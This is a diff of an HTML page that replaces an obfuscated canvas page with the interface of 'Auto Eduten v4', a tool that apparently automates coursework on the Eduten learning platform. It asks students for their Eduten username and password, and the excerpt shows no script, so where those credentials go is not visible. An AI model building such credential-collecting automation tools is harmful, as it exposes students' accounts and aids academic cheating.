@@ -1,2043 +1,1535 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>324j2ggyufsid32</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Auto Eduten v4 — Browser Edition</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-  html, body { margin: 0; height: 100%; background: #000; overflow: hidden; font-family: ui-monospace, Menlo, Consolas, monospace; }
-  #x9k2n7m { display: block; width: 100vw; height: 100vh; background: #000; }
-  .v3n7x2k { position: fixed; border: 0; background: #000; overflow: hidden; opacity: 0; pointer-events: none; }
-  #q8p3v1n { right: 12px; bottom: 12px; width: 340px; height: 250px; }
-  #m2k7x9z { right: 12px; top: 12px; width: 340px; height: 250px; }
-  #v1n8q4p { left: 12px; top: 12px; width: 300px; height: 200px; }
-  .v3n7x2k canvas { display: block; width: 100%; height: 100%; }
-  .m8z4p1q { position: absolute; left: 6px; top: 4px; color: #9fe; font-size: 10px; letter-spacing: .06em; text-shadow: 0 0 6px #000; pointer-events: none; opacity: 0; }
-  .x2k9n6v { position: relative; display: inline-block; width: 6px; height: 6px; margin: 0; padding: 0; background: #1a2a3a; }
-  #z7x3m9k { position: fixed; left: 10px; bottom: 8px; color: #8fe3c0; font: 11px/1.45 ui-monospace, monospace; white-space: pre; pointer-events: none; max-width: calc(100vw - 20px); opacity: 0; }
-  #n2p6q1v { position: fixed; inset: 0; display: none; place-content: center; padding: 40px; color: #ff9c9c; background: #100606; font: 12px/1.5 ui-monospace, monospace; white-space: pre-wrap; overflow: auto; }
-  #k9m4z8x { position: fixed; left: 12px; top: 224px; color: #ffb36b; font-size: 11px; line-height: 1.4; text-shadow: 0 0 6px #000; opacity: 0; pointer-events: none; max-width: 300px; background: #000a; padding: 6px 8px; border-radius: 4px; }
+  :root{
+    --bg-1:#070b18;
+    --bg-2:#0d1428;
+    --accent:#5b8cff;
+    --accent-2:#8b5cf6;
+    --accent-3:#22d3ee;
+    --text:#eaf0ff;
+    --muted:#93a1c4;
+    --ok:#34d399;
+    --glass:rgba(255,255,255,0.055);
+    --stroke:rgba(255,255,255,0.10);
+  }
+
+  *{ box-sizing:border-box; margin:0; padding:0; }
+  html,body{ height:100%; }
+
+  body{
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+    background:var(--bg-1);
+    color:var(--text);
+    min-height:100vh;
+    display:grid;
+    place-items:center;
+    padding:24px 16px;
+    overflow-x:hidden;
+    position:relative;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ---------- animated background ---------- */
+  .bg{
+    position:fixed; inset:0; z-index:0;
+    background:
+      radial-gradient(1200px 800px at 15% 10%, rgba(91,140,255,.30), transparent 60%),
+      radial-gradient(1000px 700px at 85% 90%, rgba(139,92,246,.28), transparent 60%),
+      radial-gradient(900px 600px at 70% 15%, rgba(34,211,238,.16), transparent 60%),
+      linear-gradient(160deg,var(--bg-1),var(--bg-2));
+  }
+  .bg::before{
+    content:""; position:absolute; inset:-40%;
+    background-image:
+      linear-gradient(rgba(255,255,255,.045) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.045) 1px, transparent 1px);
+    background-size:56px 56px;
+    mask-image:radial-gradient(ellipse at 50% 50%, #000 10%, transparent 72%);
+    -webkit-mask-image:radial-gradient(ellipse at 50% 50%, #000 10%, transparent 72%);
+    animation:drift 40s linear infinite;
+  }
+  @keyframes drift{ from{transform:translate3d(0,0,0);} to{transform:translate3d(-56px,-56px,0);} }
+
+  .orb{
+    position:fixed; border-radius:50%; filter:blur(90px); opacity:.5;
+    z-index:0; pointer-events:none;
+    animation:float 14s ease-in-out infinite;
+  }
+  .orb.a{ width:380px; height:380px; background:#5b8cff; top:-120px; left:-100px; }
+  .orb.b{ width:420px; height:420px; background:#8b5cf6; bottom:-160px; right:-120px; animation-delay:-5s; }
+  .orb.c{ width:260px; height:260px; background:#22d3ee; top:55%; left:8%; animation-delay:-9s; opacity:.32; }
+  @keyframes float{
+    0%,100%{ transform:translate(0,0) scale(1); }
+    50%{ transform:translate(28px,-32px) scale(1.08); }
+  }
+
+  /* ---------- card ---------- */
+  .shell{
+    position:relative; z-index:2;
+    width:min(92vw, 560px);
+    padding:1px; border-radius:28px;
+    background:linear-gradient(145deg, rgba(255,255,255,.28), rgba(255,255,255,.04) 40%, rgba(139,92,246,.28));
+    box-shadow:0 40px 90px -30px rgba(0,0,0,.85), 0 0 0 1px rgba(255,255,255,.04);
+    animation:rise .9s cubic-bezier(.2,.8,.2,1) both;
+    transition:opacity .5s ease, transform .5s cubic-bezier(.4,0,.2,1);
+  }
+  @keyframes rise{
+    from{ opacity:0; transform:translateY(26px) scale(.97); }
+    to{ opacity:1; transform:none; }
+  }
+
+  /* ---------- THE FIX: hide the shell completely when leaving it ---------- */
+  .shell.hidden{
+    opacity:0 !important;
+    transform:scale(.96) !important;
+    pointer-events:none !important;
+    visibility:hidden;
+    transition:opacity .45s ease,
+               transform .45s cubic-bezier(.4,0,.2,1),
+               visibility 0s linear .45s;
+  }
+
+  .card{
+    position:relative; border-radius:27px;
+    padding:44px 40px 40px;
+    background:linear-gradient(180deg, rgba(20,27,48,.92), rgba(11,16,32,.96));
+    backdrop-filter:blur(22px);
+    -webkit-backdrop-filter:blur(22px);
+    overflow:hidden; text-align:center;
+  }
+  .card::after{
+    content:""; position:absolute; top:0; left:12%; right:12%; height:1px;
+    background:linear-gradient(90deg, transparent, rgba(255,255,255,.7), transparent);
+    opacity:.7;
+  }
+
+  /* ---------- views ---------- */
+  .view{ display:none; }
+  .view.active{ display:block; animation:viewIn .45s cubic-bezier(.2,.8,.2,1) both; }
+  @keyframes viewIn{
+    from{ opacity:0; transform:translateY(12px); }
+    to{ opacity:1; transform:none; }
+  }
+
+  /* ---------- logo ---------- */
+  .logo{
+    width:76px; height:76px;
+    margin:0 auto 22px; border-radius:22px;
+    display:grid; place-items:center;
+    background:linear-gradient(150deg, var(--accent), var(--accent-2));
+    box-shadow:0 18px 40px -12px rgba(91,140,255,.85), inset 0 1px 0 rgba(255,255,255,.45);
+    position:relative;
+  }
+  .logo::before{
+    content:""; position:absolute; inset:-6px; border-radius:28px;
+    background:linear-gradient(150deg, var(--accent), var(--accent-2));
+    filter:blur(18px); opacity:.55; z-index:-1;
+  }
+  .logo svg{ width:38px; height:38px; }
+
+  /* ---------- badge ---------- */
+  .badge{
+    display:inline-flex; align-items:center; gap:8px;
+    padding:6px 14px 6px 10px; border-radius:999px;
+    background:rgba(91,140,255,.12);
+    border:1px solid rgba(91,140,255,.30);
+    font-size:12px; font-weight:600; letter-spacing:.4px;
+    color:#b9ccff; margin-bottom:18px; text-transform:uppercase;
+  }
+  .dot{
+    width:7px; height:7px; border-radius:50%;
+    background:var(--ok); box-shadow:0 0 0 0 rgba(52,211,153,.7);
+    animation:pulse 2s infinite;
+  }
+  @keyframes pulse{
+    0%{ box-shadow:0 0 0 0 rgba(52,211,153,.6); }
+    70%{ box-shadow:0 0 0 9px rgba(52,211,153,0); }
+    100%{ box-shadow:0 0 0 0 rgba(52,211,153,0); }
+  }
+
+  h1{
+    font-size:clamp(26px, 5.2vw, 34px);
+    font-weight:800; letter-spacing:-.8px; line-height:1.15;
+    background:linear-gradient(120deg,#ffffff 20%, #b8c8ff 55%, #c4a8ff 90%);
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+    margin-bottom:12px;
+  }
+  h2{
+    font-size:clamp(21px, 4.4vw, 25px);
+    font-weight:700; letter-spacing:-.5px; color:#fff;
+    margin-bottom:8px;
+  }
+
+  .sub{
+    font-size:15px; line-height:1.65; color:var(--muted);
+    max-width:410px; margin:0 auto 30px; font-weight:400;
+  }
+  .sub.tight{ margin-bottom:26px; }
+
+  /* ---------- continue button ---------- */
+  .continue{
+    position:relative; width:100%;
+    padding:17px 28px; border:none; border-radius:16px;
+    font-family:inherit; font-size:16px; font-weight:700; letter-spacing:.3px;
+    color:#fff; cursor:pointer;
+    background:linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
+    box-shadow:0 16px 34px -14px rgba(91,140,255,.95), inset 0 1px 0 rgba(255,255,255,.30);
+    transition:transform .18s ease, box-shadow .25s ease;
+    overflow:hidden;
+    display:inline-flex; align-items:center; justify-content:center; gap:10px;
+  }
+  .continue::before{
+    content:""; position:absolute; inset:0;
+    background:linear-gradient(135deg, var(--accent-2), var(--accent-3));
+    opacity:0; transition:opacity .3s ease; z-index:0;
+  }
+  .continue > *{ position:relative; z-index:1; }
+  .continue svg{ transition:transform .25s ease; }
+  .continue:hover{ transform:translateY(-2px); box-shadow:0 22px 44px -14px rgba(120,120,255,1), inset 0 1px 0 rgba(255,255,255,.35); }
+  .continue:hover::before{ opacity:1; }
+  .continue:hover svg{ transform:translateX(4px); }
+  .continue:active{ transform:translateY(0) scale(.985); }
+  .continue:focus-visible{ outline:2px solid #9db6ff; outline-offset:3px; }
+
+  /* ---------- back link ---------- */
+  .back{
+    display:inline-flex; align-items:center; gap:6px;
+    margin-top:18px; background:none; border:none;
+    font-family:inherit; font-size:13px; font-weight:600;
+    color:#7f8fb5; cursor:pointer; padding:6px 10px;
+    border-radius:10px; transition:.2s ease;
+  }
+  .back:hover{ color:#c3d2ff; background:rgba(255,255,255,.05); }
+  .back svg{ transition:transform .2s ease; }
+  .back:hover svg{ transform:translateX(-3px); }
+
+  /* ---------- form fields ---------- */
+  .field{ text-align:left; margin-bottom:16px; }
+  .field label{
+    display:block; font-size:11.5px; font-weight:700;
+    letter-spacing:.7px; text-transform:uppercase;
+    color:#8b9cc4; margin-bottom:8px; padding-left:2px;
+  }
+  .input-wrap{ position:relative; display:flex; align-items:center; }
+  .input-wrap .lead{
+    position:absolute; left:15px; width:17px; height:17px;
+    color:#7182a8; pointer-events:none; transition:color .25s ease;
+  }
+  .input-wrap input{
+    width:100%; padding:15px 46px 15px 44px;
+    border-radius:14px; border:1px solid rgba(255,255,255,.10);
+    background:rgba(255,255,255,.045); color:var(--text);
+    font-family:inherit; font-size:15px; font-weight:500; outline:none;
+    transition:border-color .25s ease, background .25s ease, box-shadow .25s ease;
+  }
+  .input-wrap input::placeholder{ color:#5d6b8c; font-weight:400; }
+  .input-wrap input:focus{
+    border-color:rgba(91,140,255,.65);
+    background:rgba(91,140,255,.09);
+    box-shadow:0 0 0 4px rgba(91,140,255,.14);
+  }
+  .input-wrap:focus-within .lead{ color:#9db6ff; }
+
+  .peek{
+    position:absolute; right:7px; width:34px; height:34px;
+    display:grid; place-items:center; border:none; border-radius:10px;
+    background:transparent; color:#7182a8; cursor:pointer; transition:.2s ease;
+  }
+  .peek:hover{ color:#c3d2ff; background:rgba(255,255,255,.07); }
+  .peek svg{ width:17px; height:17px; }
+  .peek .eye-off{ display:none; }
+  .input-wrap.revealed .peek .eye-open{ display:none; }
+  .input-wrap.revealed .peek .eye-off{ display:block; }
+
+  /* ---------- login error ---------- */
+  .login-error{
+    display:flex; align-items:center; gap:8px;
+    font-size:13px; font-weight:500;
+    color:#ff97a6;
+    background:rgba(255,90,120,.10);
+    border:1px solid rgba(255,90,120,.28);
+    border-radius:11px;
+    padding:10px 13px;
+    margin-bottom:16px;
+    text-align:left;
+    opacity:0;
+    max-height:0;
+    padding-top:0; padding-bottom:0;
+    border-width:0;
+    overflow:hidden;
+    transition:opacity .25s ease, max-height .3s ease, padding .3s ease, border-width .3s ease;
+  }
+  .login-error.show{
+    opacity:1;
+    max-height:70px;
+    padding:10px 13px;
+    border-width:1px;
+  }
+  .login-error svg{ width:15px; height:15px; flex:0 0 auto; }
+
+  .shake{ animation:shake .45s cubic-bezier(.36,.07,.19,.97); }
+  @keyframes shake{
+    10%,90%{ transform:translateX(-2px); }
+    20%,80%{ transform:translateX(4px); }
+    30%,50%,70%{ transform:translateX(-7px); }
+    40%,60%{ transform:translateX(7px); }
+  }
+
+  /* ---------- loading view ---------- */
+  .spinner{ position:relative; width:80px; height:80px; margin:0 auto 26px; }
+  .spinner::before{
+    content:""; position:absolute; inset:0; border-radius:50%;
+    background:conic-gradient(from 0deg,
+      rgba(91,140,255,0) 0deg, rgba(91,140,255,.15) 90deg,
+      var(--accent) 230deg, var(--accent-2) 320deg, rgba(139,92,246,0) 360deg);
+    -webkit-mask:radial-gradient(farthest-side, transparent calc(100% - 7px), #000 calc(100% - 6px));
+    mask:radial-gradient(farthest-side, transparent calc(100% - 7px), #000 calc(100% - 6px));
+    animation:spin 1.05s linear infinite;
+  }
+  @keyframes spin{ to{ transform:rotate(360deg); } }
+  .spinner .core{
+    position:absolute; inset:0; margin:auto; width:40px; height:40px;
+    border-radius:50%;
+    background:linear-gradient(150deg, var(--accent), var(--accent-2));
+    box-shadow:0 10px 26px -8px rgba(91,140,255,.85), inset 0 1px 0 rgba(255,255,255,.4);
+    display:grid; place-items:center;
+  }
+  .spinner .core svg{ width:20px; height:20px; color:#fff; animation:bolt 2s ease-in-out infinite; }
+  @keyframes bolt{
+    0%,100%{ opacity:1; transform:scale(1); }
+    50%{ opacity:.55; transform:scale(.9); }
+  }
+
+  .progress{
+    height:6px; max-width:320px; margin:0 auto 20px;
+    border-radius:99px; background:rgba(255,255,255,.08); overflow:hidden;
+  }
+  .progress .bar{
+    height:100%; width:0%; border-radius:99px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    box-shadow:0 0 14px rgba(91,140,255,.75);
+  }
+  .status{
+    font-size:13.5px; font-weight:500; color:#8b9cc4;
+    letter-spacing:.2px; min-height:20px;
+  }
+  .status .ellipsis::after{ content:""; animation:dots 1.4s steps(4, end) infinite; }
+  @keyframes dots{
+    0%{ content:""; } 25%{ content:"."; } 50%{ content:".."; } 75%{ content:"..."; } 100%{ content:""; }
+  }
+  .percent{
+    font-size:12px; font-weight:600; color:#5f6d8f;
+    letter-spacing:.5px; margin-top:10px; font-variant-numeric:tabular-nums;
+  }
+
+  .foot{ margin-top:24px; font-size:12px; color:#5f6d8f; letter-spacing:.3px; }
+  .foot b{ color:#8b9cc4; font-weight:600; }
+
+  /* ============================================================
+     FULL-SCREEN PAGES — SAME DARK GLASS STYLE
+     ============================================================ */
+  .page{
+    position:fixed; inset:0; z-index:900;
+    background:transparent;
+    padding:40px 24px 60px;
+    overflow-y:auto;
+    opacity:0; visibility:hidden;
+    transition:opacity .45s ease, visibility .45s;
+    text-align:left;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+  }
+  .page.active{ opacity:1; visibility:visible; }
+
+  .page-panel{
+    position:relative;
+    width:min(94vw, 960px);
+    margin:0 auto;
+    padding:1px;
+    border-radius:28px;
+    background:linear-gradient(145deg, rgba(255,255,255,.28), rgba(255,255,255,.04) 40%, rgba(139,92,246,.28));
+    box-shadow:0 40px 90px -30px rgba(0,0,0,.85), 0 0 0 1px rgba(255,255,255,.04);
+    animation:pagePanelIn .5s cubic-bezier(.2,.8,.2,1) both;
+  }
+  @keyframes pagePanelIn{
+    from{ opacity:0; transform:translateY(20px) scale(.98); }
+    to{ opacity:1; transform:none; }
+  }
+
+  .page-inner{
+    position:relative;
+    border-radius:27px;
+    padding:40px 40px 44px;
+    background:linear-gradient(180deg, rgba(20,27,48,.92), rgba(11,16,32,.96));
+    backdrop-filter:blur(22px);
+    -webkit-backdrop-filter:blur(22px);
+    overflow:hidden;
+  }
+  .page-inner::after{
+    content:"";
+    position:absolute; top:0; left:12%; right:12%; height:1px;
+    background:linear-gradient(90deg, transparent, rgba(255,255,255,.7), transparent);
+    opacity:.7;
+  }
+
+  .page-title{
+    font-size:clamp(24px, 4.5vw, 32px);
+    font-weight:800; letter-spacing:-.8px; line-height:1.15;
+    background:linear-gradient(120deg,#ffffff 20%, #b8c8ff 55%, #c4a8ff 90%);
+    -webkit-background-clip:text; background-clip:text;
+    color:transparent;
+    margin-bottom:8px;
+    text-align:center;
+  }
+  .page-sub{
+    font-size:14px;
+    color:var(--muted);
+    margin-bottom:28px;
+    font-weight:400;
+    text-align:center;
+    max-width:520px;
+    margin-left:auto;
+    margin-right:auto;
+  }
+
+  .page-back{
+    display:inline-flex; align-items:center; gap:6px;
+    background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.08);
+    color:#a9b8dc;
+    font-family:inherit;
+    font-size:13px;
+    font-weight:600;
+    padding:8px 14px;
+    border-radius:10px;
+    cursor:pointer;
+    margin-bottom:22px;
+    transition:.2s ease;
+  }
+  .page-back:hover{
+    color:#eaf0ff;
+    background:rgba(255,255,255,.10);
+    border-color:rgba(91,140,255,.4);
+  }
+  .page-back svg{ transition:transform .2s ease; }
+  .page-back:hover svg{ transform:translateX(-3px); }
+
+  /* ---------- item list (courses + lessons) ---------- */
+  .item-list{ display:flex; flex-direction:column; gap:12px; }
+
+  .item{
+    position:relative;
+    display:flex; align-items:center; justify-content:space-between;
+    gap:16px;
+    background:var(--glass);
+    border:1px solid var(--stroke);
+    border-radius:16px;
+    padding:20px 24px;
+    font-family:inherit;
+    font-size:17px;
+    font-weight:600;
+    letter-spacing:-.2px;
+    color:var(--text);
+    text-align:left;
+    cursor:pointer;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.04);
+    transition:transform .18s ease, box-shadow .22s ease, border-color .22s ease, background .18s ease;
+    animation:itemIn .45s cubic-bezier(.2,.8,.2,1) both;
+    overflow:hidden;
+  }
+  @keyframes itemIn{
+    from{ opacity:0; transform:translateY(12px); }
+    to{ opacity:1; transform:none; }
+  }
+  .item:hover{
+    transform:translateY(-2px);
+    background:rgba(255,255,255,.09);
+    border-color:rgba(91,140,255,.45);
+    box-shadow:
+      0 14px 32px -14px rgba(91,140,255,.65),
+      inset 0 1px 0 rgba(255,255,255,.06);
+  }
+  .item:active{ transform:translateY(0) scale(.995); }
+  .item:focus-visible{ outline:2px solid #9db6ff; outline-offset:3px; }
+
+  .item .label{
+    flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
+    color:var(--text);
+  }
+  .item .chev{
+    flex:0 0 auto; width:20px; height:20px;
+    color:#9db6ff;
+    opacity:.75;
+    transition:transform .2s ease, opacity .2s ease;
+  }
+  .item:hover .chev{ transform:translateX(3px); opacity:1; }
+
+  .item.featured{
+    background:linear-gradient(135deg,
+      rgba(91,140,255,.14) 0%,
+      rgba(139,92,246,.12) 100%);
+    border-color:rgba(91,140,255,.45);
+    box-shadow:
+      0 10px 28px -16px rgba(91,140,255,.7),
+      inset 0 1px 0 rgba(255,255,255,.08);
+  }
+  .item.featured .label{
+    background:linear-gradient(120deg,#ffffff 10%, #c8d6ff 60%, #d0b8ff 100%);
+    -webkit-background-clip:text; background-clip:text;
+    color:transparent;
+  }
+
+  /* ---------- tasks grid ---------- */
+  .task-list{
+    display:grid;
+    grid-template-columns:repeat(2, 1fr);
+    gap:12px;
+    margin-bottom:32px;
+  }
+  .task-card{
+    background:var(--glass);
+    border:1px solid var(--stroke);
+    border-radius:14px;
+    padding:16px 18px;
+    display:flex; flex-direction:column; gap:10px;
+    text-align:left;
+    box-shadow:inset 0 1px 0 rgba(255,255,255,.04);
+    animation:itemIn .4s cubic-bezier(.2,.8,.2,1) both;
+    transition:border-color .2s ease, background .2s ease, transform .2s ease;
+  }
+  .task-card:hover{
+    background:rgba(255,255,255,.09);
+    border-color:rgba(91,140,255,.4);
+    transform:translateY(-2px);
+  }
+  .task-cat{
+    font-size:10px; font-weight:700;
+    letter-spacing:.7px; text-transform:uppercase;
+    color:#b9ccff;
+    background:rgba(91,140,255,.16);
+    border:1px solid rgba(91,140,255,.28);
+    padding:4px 10px; border-radius:999px;
+    align-self:flex-start;
+  }
+  .task-name{
+    font-size:13.5px; font-weight:600;
+    color:#e2ebff; line-height:1.45; letter-spacing:-.1px;
+  }
+
+  /* ---------- big start button ---------- */
+  .big-start{
+    position:relative; width:100%;
+    padding:22px 28px; border:none; border-radius:16px;
+    font-family:inherit; font-size:17px; font-weight:800; letter-spacing:.2px;
+    color:#fff; cursor:pointer;
+    background:linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
+    box-shadow:
+      0 18px 40px -14px rgba(91,140,255,.95),
+      inset 0 1px 0 rgba(255,255,255,.35);
+    transition:transform .18s ease, box-shadow .25s ease;
+    overflow:hidden;
+    display:inline-flex; align-items:center; justify-content:center; gap:12px;
+  }
+  .big-start::before{
+    content:""; position:absolute; inset:0;
+    background:linear-gradient(135deg, var(--accent-2), var(--accent-3));
+    opacity:0; transition:opacity .3s ease; z-index:0;
+  }
+  .big-start::after{
+    content:""; position:absolute; top:0; left:-120%;
+    width:60%; height:100%;
+    background:linear-gradient(100deg, transparent, rgba(255,255,255,.4), transparent);
+    transform:skewX(-20deg); z-index:1;
+  }
+  .big-start:hover::before{ opacity:1; }
+  .big-start:hover::after{ animation:shine .9s ease; }
+  @keyframes shine{ to{ left:140%; } }
+  .big-start:hover{
+    transform:translateY(-3px);
+    box-shadow:
+      0 26px 50px -14px rgba(120,120,255,1),
+      inset 0 1px 0 rgba(255,255,255,.45);
+  }
+  .big-start:active{ transform:translateY(0) scale(.99); }
+  .big-start:focus-visible{ outline:2px solid #9db6ff; outline-offset:3px; }
+  .big-start span, .big-start svg{ position:relative; z-index:2; }
+  .big-start svg{ width:22px; height:22px; transition:transform .25s ease; }
+  .big-start:hover svg{ transform:translateX(4px) rotate(-4deg); }
+
+  /* ============================================================
+     TERMINAL SCREEN
+     ============================================================ */
+  .terminal-screen{
+    position:fixed; inset:0; z-index:999;
+    background:#000; opacity:0; visibility:hidden;
+    transition:opacity .7s ease, visibility .7s;
+    padding:12px 14px;
+    font-family:'Consolas','Monaco','Courier New',monospace;
+    font-size:10.5px; line-height:1.55;
+    color:#cfcfcf;
+    overflow-y:auto;
+    text-align:left;
+    cursor:text;
+  }
+  .terminal-screen.active{ opacity:1; visibility:visible; }
+
+  .term-line{
+    white-space:pre-wrap; word-break:break-word;
+    min-height:1.55em;
+  }
+  .term-ts    { color:#6f7d8f; }
+  .term-info  { color:#7fb3ff; }
+  .term-debug { color:#8d8d8d; }
+  .term-warn  { color:#f5c542; }
+  .term-error { color:#ff5f5f; }
+  .term-fatal { color:#ff2e2e; font-weight:700; }
+  .term-ok    { color:#4ec9b0; }
+  .term-dim   { color:#7a7a7a; }
+  .term-prompt{ color:#e0e0e0; }
+
+  .cursor{
+    display:inline-block; width:7px; height:11px;
+    background:#cfcfcf; vertical-align:text-bottom;
+    margin-left:1px;
+    animation:blink 1s step-end infinite;
+  }
+  @keyframes blink{ 50%{ opacity:0; } }
+
+  /* ---------- responsive ---------- */
+  @media (max-width:700px){
+    .task-list{ grid-template-columns:1fr; }
+  }
+  @media (max-width:640px){
+    .page{ padding:20px 12px 40px; }
+    .page-inner{ padding:28px 22px 32px; border-radius:22px; }
+    .page-panel{ border-radius:22px; }
+    .item{ padding:16px 18px; font-size:15px; border-radius:14px; }
+    .task-card{ padding:14px 15px; }
+    .task-name{ font-size:13px; }
+    .big-start{ padding:18px 22px; font-size:15px; border-radius:14px; }
+  }
+  @media (max-width:480px){
+    .card{ padding:34px 24px 30px; }
+    .sub{ font-size:14px; }
+    .terminal-screen{ font-size:9.5px; padding:10px 12px; }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    *, *::before, *::after{
+      animation-duration:.001ms !important;
+      animation-iteration-count:1 !important;
+      transition-duration:.001ms !important;
+    }
+  }
 </style>
 </head>
 <body>
-<canvas id="x9k2n7m"></canvas>
 
-<div class="v3n7x2k" id="v1n8q4p">
-  <div id="p4z9k1n"></div>
-  <div class="m8z4p1q">71zk2nq 92mxv 41kzp 8n3q 6x1v · 583 82kvq · 92zk 8q1v</div>
-</div>
+  <div class="bg" id="bg"></div>
+  <div class="orb a"></div>
+  <div class="orb b"></div>
+  <div class="orb c"></div>
 
-<div class="v3n7x2k" id="m2k7x9z">
-  <canvas id="w8q2n5v"></canvas>
-  <div class="m8z4p1q">92mq 6z1k 92kv · 4592² 8q3n · 83 92zk qv1n</div>
-</div>
+  <main class="shell" id="shell">
+    <section class="card">
 
-<div class="v3n7x2k" id="q8p3v1n">
-  <canvas id="z3m9x2p"></canvas>
-  <div class="m8z4p1q">6982 92zk 8q1v 8z3k / 9q2m</div>
-</div>
+      <!-- ============ WELCOME ============ -->
+      <div class="view active" id="view-welcome">
+        <div class="logo">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M13 2 4.5 13.5H11l-1 8.5 8.5-11.5H12l1-8.5Z"/>
+          </svg>
+        </div>
+        <div class="badge">
+          <span class="dot"></span>
+          v4 &nbsp;•&nbsp; Browser Edition
+        </div>
+        <h1>Auto Eduten</h1>
+        <p class="sub">
+          Built to make life easier — Auto Eduten quietly handles the
+          repetitive busywork in the background.
+        </p>
+        <button class="continue" id="continueBtn" type="button">
+          <span>Continue</span>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12h14M13 6l6 6-6 6"/>
+          </svg>
+        </button>
+        <p class="foot">Auto Eduten <b>v4</b> — Browser Edition</p>
+      </div>
 
-<div id="k9m4z8x">
-83q2 92zk 8n1v 2zk 92mq 9z3k.<br>
-8q2n 92zk 3n1v 8q3n 9z2m 92kv 8n1v.<br>
-73zk 92mq 6z1v 82kv 92zn 9q3m 8v1n.<br>
-3q9z 92mv 8n1k 92zq 6v3n 8q2m 9z1v.
-</div>
+      <!-- ============ LOGIN ============ -->
+      <div class="view" id="view-login">
+        <div class="logo">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2.5"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+        </div>
+        <h2>Sign in to Eduten</h2>
+        <p class="sub tight">
+          Enter your credentials to let Auto Eduten connect and set everything up.
+        </p>
+        <form id="loginForm" novalidate autocomplete="off">
+          <div class="field">
+            <label for="username">Username</label>
+            <div class="input-wrap">
+              <svg class="lead" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                <circle cx="12" cy="7" r="4"/>
+              </svg>
+              <input id="username" name="username" type="text" placeholder="your.username"
+                     autocomplete="off" spellcheck="false" autocapitalize="none" />
+            </div>
+          </div>
+          <div class="field">
+            <label for="password">Password</label>
+            <div class="input-wrap" id="passWrap">
+              <svg class="lead" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                   stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2.5"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
+              <input id="password" name="password" type="password" placeholder="••••••••"
+                     autocomplete="new-password" />
+              <button class="peek" id="peek" type="button" aria-label="Show password">
+                <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                     stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+                <svg class="eye-off" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                     stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+                  <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+                  <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+                  <line x1="1" y1="1" x2="23" y2="23"/>
+                </svg>
+              </button>
+            </div>
+          </div>
 
-<div id="z7x3m9k"></div>
-<pre id="n2p6q1v"></pre>
+          <div class="login-error" id="loginError">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                 stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="9"/>
+              <line x1="12" y1="8" x2="12" y2="12"/>
+              <line x1="12" y1="16" x2="12.01" y2="16"/>
+            </svg>
+            <span id="loginErrorText">Please enter something.</span>
+          </div>
+
+          <button class="continue" id="loginBtn" type="submit">
+            <span>Continue</span>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                 stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M5 12h14M13 6l6 6-6 6"/>
+            </svg>
+          </button>
+        </form>
+        <button class="back" id="backBtn" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M11 18l-6-6 6-6"/>
+          </svg>
+          Back
+        </button>
+      </div>
+
+      <!-- ============ LOADING ============ -->
+      <div class="view" id="view-loading">
+        <div class="spinner">
+          <span class="core">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                 stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M13 2 4.5 13.5H11l-1 8.5 8.5-11.5H12l1-8.5Z"/>
+            </svg>
+          </span>
+        </div>
+        <h2>Loading Auto Eduten</h2>
